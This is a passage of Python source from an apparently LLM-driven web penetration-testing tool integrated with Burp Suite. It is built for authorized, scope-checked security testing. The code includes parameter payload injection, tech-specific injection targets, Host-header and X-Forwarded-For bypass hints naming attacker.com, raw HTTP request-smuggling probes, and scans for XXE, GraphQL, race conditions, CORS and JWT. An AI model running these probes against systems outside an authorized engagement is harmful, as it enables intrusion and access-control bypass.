    elif param_location == "header":
        # Inject into a custom header
        extra_headers[param_name] = payload_value
        return url, method, body, extra_headers

    elif param_location == "cookie":
        extra_headers["Cookie"] = f"{param_name}={quote(payload_value)}"
        return url, method, body, extra_headers

    elif param_location == "path":
        # Replace last path segment
        parsed = urlparse(url)
        parts = parsed.path.rstrip("/").rsplit("/", 1)
        if len(parts) == 2:
            new_path = f"{parts[0]}/{quote(payload_value)}"
        else:
            new_path = f"/{quote(payload_value)}"
        modified_url = urlunparse(parsed._replace(path=new_path))
        return modified_url, method, body, extra_headers

    # Fallback: treat as query
    return _inject_payload(url, method, param_name, "query", payload_value)


def _nuclei_tags_to_vuln_class(tags: list[str]) -> str:
    tag_map = {
        "sqli": "SQL Injection",
        "xss": "XSS",
        "ssrf": "SSRF",
        "idor": "IDOR",
        "rce": "RCE",
        "lfi": "LFI",
        "xxe": "XXE",
        "auth-bypass": "Authentication Bypass",
        "csrf": "CSRF",
        "redirect": "Open Redirect",
    }
    for tag in tags:
        vuln = tag_map.get(tag.lower())
        if vuln:
            return vuln
    return "Misconfiguration"


def _is_in_scope(url: str, in_scope: list[str]) -> bool:
    if not in_scope:
        return True
    for scope_entry in in_scope:
        clean = scope_entry.lstrip("*.")
        if clean in url:
            return True
    return False


def _extract_linked_urls(base_url: str, html: str) -> list[str]:
    """Extract URLs with query parameters from an HTML response body.

    Returns a deduplicated list of same-origin URLs that have query strings
    (e.g. href="/search?q=test") or form action URLs. These are queued for
    follow-up crawling so the LLM sees all parameterized endpoints.
    """
    import re as _re
    from urllib.parse import urlparse as _up

    parsed = _up(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    netloc = parsed.netloc

    seen: set[str] = set()
    urls: list[str] = []

    def _add(href: str) -> None:
        href = href.strip()
        if not href or href.startswith("#") or href.startswith("javascript:"):
            return
        if href.startswith("http"):
            full = href
        elif href.startswith("//"):
            full = f"{parsed.scheme}:{href}"
        else:
            full = origin + (href if href.startswith("/") else f"/{href}")
        # Only same-origin and containing a query string
        p = _up(full)
        if p.netloc == netloc and p.query and full not in seen:
            seen.add(full)
            urls.append(full)

    # href links with query strings
    for m in _re.finditer(r'href=["\']([^"\'#]+)["\']', html, _re.IGNORECASE):
        _add(m.group(1))

    # form action URLs
    for m in _re.finditer(r'<form[^>]+action=["\']([^"\']+)["\']', html, _re.IGNORECASE):
        action = m.group(1).strip()
        # Forms without query string still useful — crawl them so LLM sees POST params
        if action and not action.startswith("javascript:"):
            href = action if action.startswith("http") else origin + (action if action.startswith("/") else f"/{action}")
            p = _up(href)
            if p.netloc == netloc and href not in seen:
                seen.add(href)
                urls.append(href)

    return urls[:20]  # cap to prevent crawl explosion


def _extract_param_candidates_from_traffic(traffic: list[dict]) -> list[dict]:
    """PentAGI 'enumerate everything' fallback — auto-extract URL query params.

    When the LLM returns zero injection candidates, extract every URL query
    parameter from captured traffic as a candidate. Ensures the exploit loop
    always has something to test on parameterized endpoints regardless of
    whether the LLM analysis succeeded.
    """
    from urllib.parse import urlparse as _up, parse_qs as _pqs

    candidates: list[dict] = []
    seen: set[tuple[str, str]] = set()

    for entry in traffic:
        url = entry.get("url", "")
        method = entry.get("method", "GET").upper()
        if not url:
            continue
        p = _up(url)
        if not p.query:
            continue
        base_path = f"{p.scheme}://{p.netloc}{p.path}"
        params = _pqs(p.query, keep_blank_values=True)

        for param_name, values in params.items():
            key = (base_path, param_name)
            if key in seen:
                continue
            seen.add(key)
            original_value = values[0] if values else ""

            # Heuristic test type assignment based on param name semantics
            low = param_name.lower()
            if any(k in low for k in ["id", "user", "account", "uid", "pid", "cid", "cat"]):
                test_types = ["sqli", "idor"]
            elif any(k in low for k in ["url", "redirect", "next", "return", "callback", "ref", "to"]):
                test_types = ["open_redirect", "ssrf"]
            elif any(k in low for k in ["file", "path", "dir", "page", "load", "template", "include"]):
                test_types = ["lfi", "ssrf"]
            elif any(k in low for k in ["cmd", "exec", "command", "run", "shell", "ping"]):
                test_types = ["rce"]
            elif any(k in low for k in ["search", "q", "query", "keyword", "term", "name"]):
                test_types = ["xss", "sqli"]
            else:
                test_types = ["sqli", "xss"]

            priority = "high" if any(k in low for k in ["id", "cat", "user", "uid"]) else "medium"
            candidates.append({
                "url": url,
                "method": method,
                "param_name": param_name,
                "param_location": "query",
                "original_value": original_value,
                "test_types": test_types,
                "priority": priority,
                "reasoning": (
                    f"Auto-extracted from URL query string (PentAGI enumerate-all fallback). "
                    f"Param '{param_name}={original_value}' found in captured traffic."
                ),
            })

    return candidates


def _get_tech_default_candidates(
    domain: str,
    tech_stack: list[str],
    base_url: str,
) -> list[dict]:
    """HexStrike TechnologyDetector-inspired tech-aware injection point defaults.

    When a known vulnerable tech stack is detected and crawl/LLM produced no
    candidates, pre-populate known-likely injection parameters so exploitation
    can proceed. Derived from vuln research on common app frameworks.
    """
    tech_lower = " ".join(tech_stack).lower()
    candidates: list[dict] = []
    base = base_url.rstrip("/")

    # ── Universal candidates (all tech stacks) ────────────────────────────────
    # Open redirect params — check before any auth surfaces
    for redirect_param in ["url", "redirect", "next", "return", "returnUrl", "goto", "target", "dest", "continue"]:
        candidates.append({
            "url": f"{base}/login",
            "method": "GET",
            "param_name": redirect_param,
            "param_location": "query",
            "original_value": "/dashboard",
            "test_types": ["open_redirect", "ssrf"],
            "priority": "medium",
            "reasoning": (
                f"Open redirect: '{redirect_param}' on login page — unvalidated redirect "
                f"enables phishing and auth-token stealing via referrer leakage"
            ),
        })
        break  # only add one to avoid flooding candidates

    # HTTP Host header injection — affects all tech stacks
    candidates.append({
        "url": f"{base}/",
        "method": "GET",
        "param_name": "Host",
        "param_location": "header",
        "original_value": domain,
        "test_types": ["host_header_injection", "ssrf", "cache_poison"],
        "priority": "medium",
        "reasoning": (
            "Host header injection → password-reset link poisoning, web-cache poisoning, "
            "SSRF via redirect. Test with Host: attacker.com"
        ),
    })

    # X-Forwarded-For IP bypass
    candidates.append({
        "url": f"{base}/admin",
        "method": "GET",
        "param_name": "X-Forwarded-For",
        "param_location": "header",
        "original_value": "127.0.0.1",
        "test_types": ["ip_bypass", "auth_bypass"],
        "priority": "medium",
        "reasoning": (
            "X-Forwarded-For: 127.0.0.1 → bypass IP-based restrictions on /admin. "
            "Servers trusting XFF without validation allow localhost spoofing."
        ),
    })

    if any(t in tech_lower for t in ["aspnet", "asp.net", "iis", "mssql"]):
        # Classic ASP.NET / WAVSEP-style vulnerable parameters
        aspnet_targets = [
            ("/listproducts.aspx?cat=1",  "cat",      "1",     ["sqli", "time_sqli"]),
            ("/artists.aspx?id=1",         "id",       "1",     ["sqli", "idor"]),
            ("/comment.aspx?id=1",         "id",       "1",     ["sqli", "idor", "xss"]),
            ("/Search.aspx?tfSearch=test", "tfSearch", "test",  ["xss", "sqli", "ssti"]),
            ("/categories.aspx?id=1",      "id",       "1",     ["sqli"]),
            ("/login.aspx",                "username", "admin", ["sqli", "auth_bypass"]),
            ("/ReadNews.aspx?id=1&NewsAd=ads/def.html", "id",     "1",           ["sqli", "idor"]),
            ("/ReadNews.aspx?id=1&NewsAd=ads/def.html", "NewsAd", "ads/def.html", ["path_traversal", "lfi"]),
            ("/Comments.aspx?id=1",        "id",       "1",     ["sqli", "idor", "xss"]),
        ]
        for path_qs, param, orig, test_types in aspnet_targets:
            url = f"{base}{path_qs}"
            candidates.append({
                "url": url,
                "method": "GET",
                "param_name": param,
                "param_location": "query",
                "original_value": orig,
                "test_types": test_types,
                "priority": "high",
                "reasoning": (
                    f"HexStrike TechnologyDetector: ASP.NET/IIS/MSSQL target — "
                    f"'{param}' is a known high-priority injection point in .aspx applications"
                ),
            })

    if any(t in tech_lower for t in ["php", "mysql", "mariadb"]):
        php_targets = [
            ("/index.php?id=1",      "id",   "1",    ["sqli", "idor"]),
            ("/search.php?q=test",   "q",    "test", ["xss", "sqli"]),
            ("/view.php?file=home",  "file", "home", ["lfi"]),
            ("/page.php?page=main",  "page", "main", ["lfi", "ssrf"]),
        ]
        for path_qs, param, orig, test_types in php_targets:
            url = f"{base}{path_qs}"
            candidates.append({
                "url": url,
                "method": "GET",
                "param_name": param,
                "param_location": "query",
                "original_value": orig,
                "test_types": test_types,
                "priority": "high",
                "reasoning": (
                    f"HexStrike TechnologyDetector: PHP target — "
                    f"'{param}' is a known high-priority injection point"
                ),
            })

    if any(t in tech_lower for t in ["nodejs", "node", "express", "mongodb"]):
        node_targets = [
            ("/?__proto__[admin]=true",  "__proto__[admin]", "true",  ["prototype_pollution"]),
            ("/api/v1/users?sort=name",  "sort",             "name",  ["nosql", "sqli"]),
            ("/api/v1/users/1",          "id",               "1",     ["idor"]),
        ]
        for path_qs, param, orig, test_types in node_targets:
            url = f"{base}{path_qs}"
            candidates.append({
                "url": url,
                "method": "GET",
                "param_name": param,
                "param_location": "query",
                "original_value": orig,
                "test_types": test_types,
                "priority": "high",
                "reasoning": (
                    f"HexStrike TechnologyDetector: Node.js/MongoDB target — "
                    f"'{param}' candidate for NoSQL injection / prototype pollution"
                ),
            })

    return candidates


def _ollama_url() -> str:
    return os.getenv("OLLAMA_URL", "http://localhost:11434").rstrip("/") + "/v1"


# ── New Burp MCP helpers (BURP-MCP-MAXIMIZE.md) ───────────────────────────────

async def _test_http2_support(
    burp: "BurpMCPClient",
    host: str,
    port: int,
) -> bool:
    """Check whether the target supports HTTP/2 by sending a probe via Burp.

    Returns True if Burp returned a valid response with protocol HTTP/2.
    HTTP/2 exposes extra attack surfaces: header injection, stream
    manipulation, H2-to-H1 desync, and priority attacks.
    """
    try:
        from pentra_tools.burp.client import BurpHttpResponse
        resp = await burp.send_http2_request(
            hostname=host,
            port=port,
            uses_https=True,
            content=f"GET / HTTP/2\r\nHost: {host}\r\n\r\n",
        )
        return resp.status_code > 0 and resp.protocol == "HTTP/2"
    except Exception:
        return False


async def _test_websocket_endpoints(
    burp: "BurpMCPClient",
    scope: ScopeEnforcer,
) -> list[dict]:
    """Analyse Burp WebSocket history for security issues.

    Looks for patterns commonly associated with:
    - Sensitive data exposure (tokens, passwords, user IDs)
    - Authentication-related messages

    Returns a list of finding dicts (same schema as other findings).
    """
    findings: list[dict] = []
    try:
        # Use regex-filtered fetch for efficiency (server-side filter by in-scope domains)
        _domain_patterns = "|".join(
            d.lstrip("*.").replace(".", r"\.") for d in scope._in_scope[:5]
        ) if scope._in_scope else "."
        try:
            ws_history = await burp.get_proxy_websocket_history_regex(
                filter_regex=_domain_patterns, limit=100
            )
        except Exception:
            # Fallback to unfiltered if regex variant fails
            ws_history = await burp.get_proxy_websocket_history(limit=100)

        if not ws_history:
            return []

        log.info("[vuln_hunt_node] WebSocket history: %d messages to analyse", len(ws_history))

        in_scope_ws = [
            msg for msg in ws_history
            if msg.url and _is_ws_in_scope(msg.url, scope)
        ]

        SENSITIVE_PATTERNS = [
            ("token",    "medium", "Authentication token in WebSocket message"),
            ("password", "high",   "Password in WebSocket message"),
            ("secret",   "high",   "Secret value in WebSocket message"),
            ('"id":',    "medium", "User ID exposed in WebSocket message"),
            ("admin",    "medium", "Admin reference in WebSocket message"),
            ("apikey",   "high",   "API key in WebSocket message"),
            ("authori",  "medium", "Authorization data in WebSocket message"),
        ]
        for msg in in_scope_ws:
            msg_lower = msg.message.lower()
            for pattern, severity, description in SENSITIVE_PATTERNS:
                if pattern.lower() in msg_lower:
                    findings.append({
                        "title": f"Sensitive Data in WebSocket: {description}",
                        "severity": severity,
                        "vuln_class": "INFORMATION_DISCLOSURE",
                        "target_url": msg.url,
                        "description": (
                            f"WebSocket message contains sensitive pattern '{pattern}'. "
                            f"Direction: {msg.direction}. "
                            f"Preview: {msg.message[:200]}"
                        ),
                        "request_raw": f"WebSocket {msg.direction}: {msg.message[:500]}",
                        "response_raw": "",
                        "source": "burp_websocket_analysis",
                    })
                    break  # one finding per message
    except Exception as exc:
        log.warning("[vuln_hunt_node] WebSocket analysis failed: %s", exc)

    return findings


def _is_ws_in_scope(url: str, scope: ScopeEnforcer) -> bool:
    """Check if a WebSocket URL is in-scope (convert ws:// → http:// for scope check)."""
    http_url = url.replace("ws://", "http://").replace("wss://", "https://")
    try:
        scope.validate_or_raise(http_url)
        return True
    except Exception:
        return False


async def _setup_intruder_for_sqli(
    burp: "BurpMCPClient",
    scope: ScopeEnforcer,
    url: str,
    param: str,
    base_request: str,
) -> bool:
    """Set up Burp Intruder for SQL injection fuzzing on a confirmed candidate.

    This is a "handoff" pattern: agent prepares the Intruder tab with
    the correct insertion point, the researcher launches the attack from
    the Burp Suite UI.

    Returns True on success, False on any failure.
    """
    try:
        scope.validate_or_raise(url)

        from urllib.parse import urlparse as _up_int
        parsed = _up_int(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_https = parsed.scheme == "https"

        # Locate the parameter's value in the raw request for Intruder markers
        param_key = f"{param}="
        param_start = base_request.find(param_key)
        if param_start == -1:
            return False

        value_start = param_start + len(param_key)
        value_end = base_request.find("&", value_start)
        if value_end == -1:
            # Last parameter — check for HTTP body end vs. query end
            # Find end of URL/body line
            newline_end = base_request.find("\r\n", value_start)
            value_end = newline_end if newline_end != -1 else len(base_request)

        await burp.send_to_intruder(
            host=host,
            port=port,
            request=base_request,
            use_https=use_https,
            insertion_points=[{"start": value_start, "end": value_end}],
        )
        log.info(
            "[vuln_hunt_node] Intruder configured for SQLi on %s param=%s — "
            "launch from Burp UI",
            url, param,
        )
        return True

    except ScopeViolationError as exc:
        log.warning("[vuln_hunt_node] Intruder setup blocked — scope: %s", exc)
        return False
    except Exception as exc:
        log.warning("[vuln_hunt_node] Intruder setup failed: %s", exc)
        return False


async def _test_request_smuggling(
    burp: "BurpMCPClient",
    host: str,
    port: int,
    use_https: bool,
) -> list[dict]:
    """Detect HTTP Request Smuggling conditions via send_http1_request.

    Uses two non-destructive timing probes:
    - CL.TE: Content-Length ends request early; Transfer-Encoding chunked body
      is left on the wire and prepended to the next request.
    - TE.CL: Transfer-Encoding chunked terminates the body; surplus bytes per
      Content-Length go to the next request.

    For safety, probes use a COMPLETE chunked body (``0\\r\\n\\r\\n`` terminator)
    so no partial data is ever left on the socket.  Timing anomalies (>3 s
    longer than baseline) and 400/500 responses on a GET are flagged.
    Returns Repeater tab links so the researcher can verify manually.
    """
    findings: list[dict] = []
    scheme = "https" if use_https else "http"
    target_url = f"{scheme}://{host}:{port}/"

    # ── Baseline timing ──────────────────────────────────────────────────────
    import time as _t
    _baseline_req = (
        f"GET / HTTP/1.1\r\nHost: {host}\r\n"
        "User-Agent: PentraAI/1.0\r\nConnection: close\r\n\r\n"
    )
    try:
        _t0 = _t.monotonic()
        await burp.send_http1_request(
            hostname=host, port=port, uses_https=use_https, content=_baseline_req
        )
        _baseline_ms = (_t.monotonic() - _t0) * 1000
    except Exception:
        _baseline_ms = 1000.0  # assume 1 s if baseline fails

    _TIMING_THRESHOLD_MS = max(_baseline_ms * 3, 4000)  # 3× baseline or 4 s

    # ── CL.TE probe ──────────────────────────────────────────────────────────
    # Content-Length: 4 (only reads "1\r\n\r"); back-end sees chunked 0 terminator.
    # If TE.CL: back-end uses CL=4, reads "1\r\n\r", waits for \n → timeout.
    cl_te_req = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        "User-Agent: PentraAI/1.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "1\r\n"
        "Z\r\n"
        "0\r\n\r\n"
    )
    try:
        _t0 = _t.monotonic()
        await burp.send_http1_request(
            hostname=host, port=port, uses_https=use_https, content=cl_te_req
        )
        cl_te_ms = (_t.monotonic() - _t0) * 1000
    except Exception as e:
        cl_te_ms = 0.0
        log.debug("[smuggling] CL.TE probe error: %s", e)

    # ── TE.CL probe ──────────────────────────────────────────────────────────
    # Transfer-Encoding: chunked used by front-end; Content-Length: 6 used by back-end.
    # If CL.TE: back-end uses chunked but receives CL=6 leftover → smuggles.
    te_cl_req = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        "User-Agent: PentraAI/1.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\n"
        "X"
    )
    try:
        _t0 = _t.monotonic()
        await burp.send_http1_request(
            hostname=host, port=port, uses_https=use_https, content=te_cl_req
        )
        te_cl_ms = (_t.monotonic() - _t0) * 1000
    except Exception as e:
        te_cl_ms = 0.0
        log.debug("[smuggling] TE.CL probe error: %s", e)

    # ── Evaluate ─────────────────────────────────────────────────────────────
    suspicious = []
    if cl_te_ms > _TIMING_THRESHOLD_MS:
        suspicious.append(("CL.TE", cl_te_ms, cl_te_req))
    if te_cl_ms > _TIMING_THRESHOLD_MS:
        suspicious.append(("TE.CL", te_cl_ms, te_cl_req))

    for variant, elapsed_ms, raw_req in suspicious:
        log.warning(
            "[vuln_hunt_node] HTTP Request Smuggling candidate (%s) on %s — %.0f ms (baseline %.0f ms)",
            variant, host, elapsed_ms, _baseline_ms,
        )
        # Save the triggering probe to Repeater for manual confirmation
        try:
            await burp.create_repeater_tab(
                host=host, port=port, use_https=use_https,
                request=raw_req,
                tab_name=f"PentraAI Smuggling {variant}: {host}",
            )
        except Exception:
            pass

        findings.append({
            "title": f"Possible HTTP Request Smuggling ({variant})",
            "severity": "high",
            "vuln_class": "HTTP_REQUEST_SMUGGLING",
            "target_url": target_url,
            "description": (
                f"Timing anomaly detected on {variant} probe: {elapsed_ms:.0f} ms "
                f"vs baseline {_baseline_ms:.0f} ms. "
                f"This may indicate the server processes HTTP/1.1 headers "
                f"inconsistently, enabling request smuggling. "
                f"Probe saved to Burp Repeater tab 'PentraAI Smuggling {variant}: {host}' "
                f"for manual verification."
            ),
            "request": raw_req[:500],
            "response": "",
            "source": "burp_smuggling_probe",
            "impact": (
                "Attacker can poison the front-end/back-end TCP socket, "
                "hijack other users' requests, bypass access controls, "
                "or achieve reflected XSS via response queue poisoning."
            ),
            "remediation": (
                "Configure the server to reject ambiguous requests (both CL and TE present). "
                "Prefer HTTP/2 end-to-end. Disable Transfer-Encoding on the back-end if "
                "the front-end normalises to CL."
            ),
            "cvss_score": 8.1,
        })

    if not suspicious:
        log.info("[vuln_hunt_node] Request smuggling probes: no timing anomaly on %s", host)

    return findings


async def _save_interesting_request_to_repeater(
    burp: "BurpMCPClient",
    url: str,
    request: str,
    finding_title: str,
) -> None:
    """Save a confirmed or potential finding's request to Burp Repeater.

    Creates a labelled Repeater tab so the researcher can immediately
    reproduce and manually test the finding from the Burp Suite UI.
    Non-critical: failures are logged at DEBUG level and swallowed.
    """
    try:
        from urllib.parse import urlparse as _up_rep
        parsed = _up_rep(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_https = parsed.scheme == "https"

        tab = await burp.create_repeater_tab(
            host=host,
            port=port,
            request=request,
            use_https=use_https,
            tab_name=f"PentraAI: {finding_title[:50]}",
        )
        log.info("[vuln_hunt_node] Saved to Repeater: '%s'", finding_title[:50])
    except Exception as exc:
        log.debug("[vuln_hunt_node] Repeater save failed (non-critical): %s", exc)


async def _run_burp_extended_checks(
    domain: str,
    scope: dict,
    endpoints: list[dict],
) -> list[dict]:
    """Orchestrate HTTP/2 detection and WebSocket history analysis via Burp.

    Runs silently if Burp is not configured or unreachable.
    Returns list of finding dicts (same schema as other finding sources).
    """
    burp_url, burp_enabled = _get_burp_config()
    if not burp_url or not burp_enabled or not _BURP_AVAILABLE:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    out_of_scope: list[str] = scope.get("out_of_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=out_of_scope)

    client = BurpMCPClient(base_url=burp_url)
    if not await client.health_check():
        return []

    async with client.managed_session():
        findings: list[dict] = []

        # ── HTTP/2 detection ────────────────────────────────────────────────────
        primary_host = domain
        primary_port = 443
        for ep in endpoints[:1]:
            url = ep.get("url", "")
            if url:
                from urllib.parse import urlparse as _up_ext
                p = _up_ext(url)
                if p.hostname:
                    primary_host = p.hostname
                    primary_port = p.port or (443 if p.scheme == "https" else 80)
                break

        is_http2 = await _test_http2_support(client, primary_host, primary_port)
        if is_http2:
            log.info("[vuln_hunt_node] Target %s supports HTTP/2 — saving H2 probe to Repeater", primary_host)
            h2_probe = (
                f"GET /?pentra_h2_test=1 HTTP/2\r\n"
                f"Host: {primary_host}\r\n"
                "Accept: */*\r\n"
                "Transfer-Encoding: chunked\r\n"  # TE desync test signal
                "\r\n"
            )
            try:
                await client.create_repeater_tab_http2(
                    host=primary_host,
                    port=primary_port,
                    request=h2_probe,
                    use_https=True,
                    tab_name=f"PentraAI H2: {primary_host}",
                )
            except Exception as exc:
                log.debug("[vuln_hunt_node] H2 Repeater tab failed: %s", exc)

            findings.append({
                "title": f"HTTP/2 Supported — Extended Attack Surface",
                "severity": "info",
                "vuln_class": "INFORMATION_DISCLOSURE",
                "target_url": f"https://{primary_host}:{primary_port}/",
                "description": (
                    f"Target supports HTTP/2. Probe request saved to Burp Repeater "
                    f"for manual H2-specific testing (header injection, TE desync, "
                    f"stream manipulation). Launch from Burp UI."
                ),
                "source": "burp_http2_probe",
            })

        # ── HTTP Request Smuggling probes ───────────────────────────────────────
        smuggling_findings = await _test_request_smuggling(
            client, primary_host, primary_port, use_https=primary_port == 443
        )
        findings.extend(smuggling_findings)

        # ── WebSocket analysis ──────────────────────────────────────────────────
        ws_findings = await _test_websocket_endpoints(client, enforcer)
        findings.extend(ws_findings)
        if ws_findings:
            log.info("[vuln_hunt_node] WebSocket analysis: %d finding(s)", len(ws_findings))

        return findings


async def _run_soap_xxe_scan(
    domain: str,
    scope: dict,
    auth_credentials: dict | None = None,
) -> list[dict]:
    """Task 18.8 — SOAP/WSDL discovery + XXE injection scan.

    Runs silently on non-XML targets. Only emits findings on confirmed WSDL
    discovery or confirmed XXE injection.
    """
    try:
        from pentra_tools.vuln.soap_xxe import SoapXxeScanner
    except ImportError:
        return []

    # Scope check
    in_scope: list[str] = scope.get("in_scope", [])
    if not in_scope:
        return []

    # Build base URL from domain
    base_url = f"https://{domain}" if not domain.startswith("http") else domain
    burp_proxy = _get_burp_proxy()

    # Get auth headers/cookies
    auth_headers: dict[str, str] = {}
    auth_cookies: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds = AuthCredentials(**auth_credentials)
            if not _creds.is_empty() and _creds.type != "auto_login":
                auth_headers, auth_cookies = SessionManager(_creds).get_auth_headers()
        except Exception:
            pass

    # Get Collaborator URL from Burp (if available)
    collab_url: str | None = None
    burp_url, burp_enabled = _get_burp_config()
    if burp_url and burp_enabled and _BURP_AVAILABLE:
        try:
            _bc = BurpMCPClient(base_url=burp_url)
            if await _bc.health_check():
                collab = await _bc.generate_collaborator_payload()
                collab_url = collab.payload_url if collab else None
        except Exception:
            pass

    try:
        scanner = SoapXxeScanner(
            base_url=base_url,
            burp_collaborator=collab_url,
            proxy_url=burp_proxy,
        )
        findings = await scanner.scan(auth_headers=auth_headers, auth_cookies=auth_cookies)
        if findings:
            log.info("[vuln_hunt_node] SOAP/XXE scan: %d finding(s)", len(findings))
        else:
            log.debug("[vuln_hunt_node] SOAP/XXE scan: no findings on %s", domain)
        return findings
    except Exception as exc:
        log.debug("[vuln_hunt_node] SOAP/XXE scan failed (non-fatal): %s", exc)
        return []


async def _run_graphql_scan(
    domain: str,
    scope: dict,
    auth_credentials: dict | None = None,
) -> list[dict]:
    """Task 19.1 — GraphQL endpoint discovery + security analysis.

    Probes common GraphQL paths, then runs introspection/SQLi/batch/DoS tests.
    Runs silently on non-GraphQL targets.
    """
    try:
        from pentra_tools.vuln.graphql_analyzer import (
            detect_graphql_endpoints,
            analyze_graphql_endpoint,
        )
    except ImportError:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    if not in_scope:
        return []

    base_url = f"https://{domain}" if not domain.startswith("http") else domain
    burp_proxy = _get_burp_proxy()

    # Build auth headers from credentials
    auth_headers: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds = AuthCredentials(**auth_credentials)
            if not _creds.is_empty() and _creds.type != "auto_login":
                auth_headers, _ = SessionManager(_creds).get_auth_headers()
        except Exception:
            pass

    try:
        import httpx as _httpx
        proxies = {"http://": burp_proxy, "https://": burp_proxy} if burp_proxy else None
        async with _httpx.AsyncClient(
            verify=False,  # noqa: S501
            follow_redirects=True,
            timeout=8.0,
            proxies=proxies,  # type: ignore[arg-type]
        ) as client:
            graphql_endpoints = await detect_graphql_endpoints(
                base_url, client, auth_headers or None
            )

        if not graphql_endpoints:
            log.debug("[vuln_hunt_node] No GraphQL endpoints on %s", domain)
            return []

        log.info("[vuln_hunt] GraphQL: %d endpoint(s) found — running analysis", len(graphql_endpoints))

        all_findings: list[dict] = []
        for ep in graphql_endpoints[:3]:  # cap at 3 endpoints
            findings = await analyze_graphql_endpoint(
                ep,
                auth_headers=auth_headers or None,
            )
            all_findings.extend(findings)

        if all_findings:
            log.info("[vuln_hunt] GraphQL: %d finding(s)", len(all_findings))
        return all_findings

    except Exception as exc:
        log.debug("[vuln_hunt_node] GraphQL scan failed (non-fatal): %s", exc)
        return []


async def _run_race_condition_scan(
    endpoints: list[dict],
    scope: dict,
    auth_credentials: dict | None = None,
) -> list[dict]:
    """Task 19.2 — Race condition detection on POST/PATCH endpoints.

    Identifies race-prone endpoints by URL pattern, then sends concurrent
    requests to detect timing-based business logic flaws.
    """
    try:
        from pentra_tools.vuln.race_condition import identify_race_candidates, check_race_condition
    except ImportError:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=scope.get("out_of_scope", []))
    burp_proxy = _get_burp_proxy()

    auth_headers: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds = AuthCredentials(**auth_credentials)
            if not _creds.is_empty() and _creds.type != "auto_login":
                auth_headers, _ = SessionManager(_creds).get_auth_headers()
        except Exception:
            pass

    candidates = identify_race_candidates(endpoints)
    if not candidates:
        return []

    log.info("[vuln_hunt] Race condition: testing %d candidates", len(candidates))
    all_findings: list[dict] = []

    for candidate in candidates[:5]:  # cap at 5
        url = candidate.get("url", "")
        if not url:
            continue
        try:
            enforcer.validate_or_raise(url)
        except ScopeViolationError:
            continue
        try:
            result = await check_race_condition(
                url=url,
                method=candidate.get("method", "POST"),
                headers=auth_headers or None,
                concurrency=15,
                scope_check_fn=lambda u: True,  # already scope-checked above
                proxy_url=burp_proxy,
            )
            if result and result.race_detected:
                finding = result.to_finding()
                if finding:
                    all_findings.append(finding)
                    log.info("[vuln_hunt] Race condition CONFIRMED at %s", url)
        except Exception as exc:
            log.debug("[vuln_hunt_node] Race condition test failed for %s: %s", url, exc)

    return all_findings


async def _run_cors_scan(
    endpoints: list[dict],
    scope: dict,
    auth_credentials: dict | None = None,
) -> list[dict]:
    """Task 19.3 — CORS misconfiguration detection on live endpoints.

    Tests Origin header reflection and credentials-enabled CORS misconfigs.
    """
    try:
        from pentra_tools.vuln.cors_tester import check_cors
    except ImportError:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=scope.get("out_of_scope", []))
    burp_proxy = _get_burp_proxy()

    auth_headers: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds = AuthCredentials(**auth_credentials)
            if not _creds.is_empty() and _creds.type != "auto_login":
                auth_headers, _ = SessionManager(_creds).get_auth_headers()
        except Exception:
            pass

    all_findings: list[dict] = []
    tested = 0

    for ep in endpoints[:8]:  # cap at 8 endpoints
        url = ep.get("url", "")
        if not url:
            continue
        try:
            enforcer.validate_or_raise(url)
        except ScopeViolationError:
            continue
        try:
            findings = await check_cors(url, auth_headers=auth_headers or None, proxy_url=burp_proxy)
            all_findings.extend(findings)
            tested += 1
        except Exception as exc:
            log.debug("[vuln_hunt_node] CORS test failed for %s: %s", url, exc)

    if all_findings:
        log.info("[vuln_hunt] CORS: %d finding(s) on %d endpoints", len(all_findings), tested)
    return all_findings


async def _run_jwt_scan(
    domain: str,
    scope: dict,
    auth_credentials: dict | None = None,
    state: dict | None = None,
) -> list[dict]:
    """Task 20.1 — JWT vulnerability testing (none algorithm, invalid sig, kid SQLi).

    Probes common API endpoints for JWT tokens, then runs attack scenarios.
    Silent on targets without JWT authentication.
    """
    try:
        from pentra_tools.vuln.jwt_tester import test_jwt_vulnerabilities, _extract_jwt_from_state
    except ImportError:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    if not in_scope:
        return []

    base_url = f"https://{domain}" if not domain.startswith("http") else domain

    # Extract auth headers from credentials
    auth_headers: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds = AuthCredentials(**auth_credentials)
            if not _creds.is_empty() and _creds.type != "auto_login":
                auth_headers, _ = SessionManager(_creds).get_auth_headers()
        except Exception:
            pass

    # Extract known JWT from state
    known_jwt: str | None = None
    if state:
        known_jwt = _extract_jwt_from_state(state)

    try:
        findings = await test_jwt_vulnerabilities(
            base_url=base_url,
            auth_headers=auth_headers or None,
            known_jwt=known_jwt,
        )
        if findings:
            log.info("[vuln_hunt] JWT: %d finding(s) on %s", len(findings), domain)
        return findings
    except Exception as exc:
        log.debug("[vuln_hunt_node] JWT scan failed (non-fatal): %s", exc)
        return []


async def _run_second_order_sqli_scan(
    domain: str,
    scope: dict,
    auth_credentials: dict | None = None,
